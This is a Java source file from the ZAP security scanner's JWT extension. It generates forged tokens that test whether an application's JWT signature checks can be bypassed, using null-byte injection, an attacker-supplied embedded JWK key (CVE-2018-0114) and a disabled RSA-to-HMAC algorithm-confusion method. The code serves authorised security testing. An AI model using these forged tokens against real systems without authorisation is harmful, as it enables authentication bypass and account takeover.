/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2019 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.jwt.fuzzer;

import static org.zaproxy.zap.extension.jwt.JWTUtils.HMAC_256;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JSON_WEB_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_ALGORITHM_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_EXP_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_HEADER_WITH_ALGO_PLACEHOLDER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_RSA_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_TOKEN_PERIOD_CHARACTER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.NULL_BYTE_CHARACTER;

import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.jwk.gen.RSAKeyGenerator;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SignatureException;
import java.security.spec.InvalidKeySpecException;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.List;
import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;
import org.parosproxy.paros.Constant;
import org.zaproxy.zap.extension.jwt.JWTExtensionValidationException;
import org.zaproxy.zap.extension.jwt.JWTTokenBean;
import org.zaproxy.zap.extension.jwt.JWTUtils;

/** @author preetkaran20@gmail.com KSASAN */
public class SignatureFuzzer implements JWTFuzzer {

    private static final Logger LOGGER = Logger.getLogger(SignatureFuzzer.class);

    /**
     * Adds Null Byte to the signature to check if JWT is vulnerable to Null Byte injection
     *
     * @param jwtTokenBean
     * @return Null Byte fuzzed token
     * @throws UnsupportedEncodingException
     */
    private String getNullByteFuzzedToken(JWTTokenBean jwtTokenBean)
            throws UnsupportedEncodingException {
        JWTTokenBean cloneJWTTokenBean = new JWTTokenBean(jwtTokenBean);
        cloneJWTTokenBean.setSignature(
                cloneJWTTokenBean.getSignature() + NULL_BYTE_CHARACTER + Constant.getEyeCatcher());
        return cloneJWTTokenBean.getToken();
    }

    /**
     * Payload is as per the https://nvd.nist.gov/vuln/detail/CVE-2018-0114 vulnerability
     *
     * @param jwtTokenBean
     * @throws NoSuchAlgorithmException
     * @throws JOSEException
     * @throws ParseException
     */
    private void populateTokenSignedWithCustomPrivateKey(
            JWTTokenBean jwtTokenBean, List<String> fuzzedToken)
            throws NoSuchAlgorithmException, JOSEException, ParseException {
        JSONObject headerJSONObject = new JSONObject(jwtTokenBean.getHeader());
        JSONObject payloadJSONObject = new JSONObject(jwtTokenBean.getPayload());
        String algoType = headerJSONObject.getString(JWT_ALGORITHM_KEY_HEADER);
        if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
            long expiryTimeInMillis = payloadJSONObject.getLong(JWT_EXP_ALGORITHM_IDENTIFIER);
            expiryTimeInMillis = expiryTimeInMillis + 2000;
            payloadJSONObject.put(JWT_EXP_ALGORITHM_IDENTIFIER, expiryTimeInMillis);

            // Generating JWK
            RSAKeyGenerator rsaKeyGenerator = new RSAKeyGenerator(2048);
            rsaKeyGenerator.algorithm(JWSAlgorithm.parse(algoType));
            RSAKey rsaKey = rsaKeyGenerator.generate();
            headerJSONObject.put(JSON_WEB_KEY_HEADER, rsaKey.toJSONObject());

            // Getting base64 encoded signed token
            JWTTokenBean newJWTokenBean = new JWTTokenBean();
            newJWTokenBean.setPayload(payloadJSONObject.toString());
            JWSSigner signer = new RSASSASigner(rsaKey);
            SignedJWT signedJWT =
                    new SignedJWT(
                            JWSHeader.parse(headerJSONObject.toString()),
                            JWTClaimsSet.parse(payloadJSONObject.toString()));
            signedJWT.sign(signer);
            fuzzedToken.add(signedJWT.serialize());
        }
    }

    /**
     * Returns Fuzzed token by confusing algo keys.
     *
     * <p>Background about the attack:<br>
     * Say an application is using RSA to sign JWT now what will be the verification method {@code
     * verify(String jwtToken, byte[] key); }
     *
     * <p>Now if application is using RSA then for verification RSA public key will be used and in
     * case jwttoken is based on HMAC algorithm then verify method will think key as Secret key for
     * HMAC and will try to decrypt it and as public key is known to everyone so anyone can sign the
     * key with public key and HMAC will accept it.
     *
     * @param jwtTokenBean
     * @return
     * @throws JSONException
     * @throws IOException
     * @throws InvalidKeySpecException
     * @throws NoSuchAlgorithmException
     * @throws InvalidKeyException
     * @throws SignatureException
     * @throws JWTExtensionValidationException
     */
    @Deprecated
    // Not used need to design using nimbus jose
    private String getAlgoKeyConfusionFuzzedToken(JWTTokenBean jwtTokenBean)
            throws JWTExtensionValidationException, JSONException, NoSuchAlgorithmException,
                    InvalidKeySpecException, IOException {
        String fuzzedToken = null;
        JSONObject jwtHeaderJSON = new JSONObject(jwtTokenBean.getHeader());
        String algoType = jwtHeaderJSON.getString(JWT_ALGORITHM_KEY_HEADER);
        if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
            String jwtFuzzedHeader = String.format(JWT_HEADER_WITH_ALGO_PLACEHOLDER, HMAC_256);
            String base64EncodedFuzzedHeaderAndPayload =
                    JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(jwtFuzzedHeader)
                            + JWT_TOKEN_PERIOD_CHARACTER
                            + JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(
                                    jwtTokenBean.getPayload());
            byte[] base64EncodedFuzzedHeaderAndPayloadBytes =
                    JWTUtils.getBytes(base64EncodedFuzzedHeaderAndPayload);
            String base64EncodedFuzzedTokenSign =
                    JWTUtils.getBase64EncodedHMACSignedToken(
                            base64EncodedFuzzedHeaderAndPayloadBytes,
                            JWTUtils.getRSAPublicKey().getEncoded());
            fuzzedToken =
                    base64EncodedFuzzedHeaderAndPayload
                            + JWT_TOKEN_PERIOD_CHARACTER
                            + base64EncodedFuzzedTokenSign;
        }
        return fuzzedToken;
    }

    @Override
    public List<String> fuzzedTokens(JWTTokenBean jwtTokenBean) {
        List<String> fuzzedTokens = new ArrayList<>();

        try {
            populateTokenSignedWithCustomPrivateKey(jwtTokenBean, fuzzedTokens);
            // String confusionFuzzedToken = getAlgoKeyConfusionFuzzedToken(jwtTokenBean);
            // if (Objects.nonNull(confusionFuzzedToken)) {
            // fuzzedTokens.add(confusionFuzzedToken);
            // }
            fuzzedTokens.add(getNullByteFuzzedToken(jwtTokenBean));

        } catch (NoSuchAlgorithmException
                | JSONException
                | IOException
                | JOSEException
                | ParseException e) {
            LOGGER.error("error occurred while getting signed fuzzed tokens", e);
        }
        return fuzzedTokens;
    }
}
